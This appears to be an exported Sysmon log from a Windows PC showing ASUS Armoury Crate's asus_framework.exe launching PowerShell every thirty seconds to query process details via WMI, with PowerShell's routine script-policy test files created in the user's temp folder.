+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:32:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:32:31.100
+ProcessGuid: {7f6f9216-525f-687d-e407-000000006901}
+ProcessId: 24356
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_5iluj5v3.ye3.ps1
+CreationUtcTime: 2025-07-20 20:32:31.100
+User: SHARON\Shxro"
+"20/07/2025 21:32:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:32:31.027
+ProcessGuid: {7f6f9216-525f-687d-e407-000000006901}
+ProcessId: 24356
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:32:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:32:01.092
+ProcessGuid: {7f6f9216-5241-687d-e107-000000006901}
+ProcessId: 26200
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_egmpiydz.wvm.ps1
+CreationUtcTime: 2025-07-20 20:32:01.092
+User: SHARON\Shxro"
+"20/07/2025 21:32:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:32:01.019
+ProcessGuid: {7f6f9216-5241-687d-e107-000000006901}
+ProcessId: 26200
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:31:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:31:31.079
+ProcessGuid: {7f6f9216-5223-687d-df07-000000006901}
+ProcessId: 5160
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_dtpqeriz.aaf.ps1
+CreationUtcTime: 2025-07-20 20:31:31.078
+User: SHARON\Shxro"
+"20/07/2025 21:31:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:31:31.004
+ProcessGuid: {7f6f9216-5223-687d-df07-000000006901}
+ProcessId: 5160
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:31:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:31:01.077
+ProcessGuid: {7f6f9216-5205-687d-dc07-000000006901}
+ProcessId: 18384
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_swg0hftu.cbu.ps1
+CreationUtcTime: 2025-07-20 20:31:01.077
+User: SHARON\Shxro"
+"20/07/2025 21:31:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:31:01.002
+ProcessGuid: {7f6f9216-5205-687d-dc07-000000006901}
+ProcessId: 18384
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:30:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:30:31.071
+ProcessGuid: {7f6f9216-51e6-687d-da07-000000006901}
+ProcessId: 22204
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_dkryhafj.xvh.ps1
+CreationUtcTime: 2025-07-20 20:30:31.071
+User: SHARON\Shxro"
+"20/07/2025 21:30:30","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:30:30.997
+ProcessGuid: {7f6f9216-51e6-687d-da07-000000006901}
+ProcessId: 22204
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:30:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:30:01.066
+ProcessGuid: {7f6f9216-51c8-687d-d707-000000006901}
+ProcessId: 26104
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_q0qnxo25.ojy.ps1
+CreationUtcTime: 2025-07-20 20:30:01.066
+User: SHARON\Shxro"
+"20/07/2025 21:30:00","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:30:00.991
+ProcessGuid: {7f6f9216-51c8-687d-d707-000000006901}
+ProcessId: 26104
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:29:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:29:31.073
+ProcessGuid: {7f6f9216-51aa-687d-d507-000000006901}
+ProcessId: 28396
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_auuoj3ld.mi4.ps1
+CreationUtcTime: 2025-07-20 20:29:31.072
+User: SHARON\Shxro"
+"20/07/2025 21:29:30","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:29:30.986
+ProcessGuid: {7f6f9216-51aa-687d-d507-000000006901}
+ProcessId: 28396
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
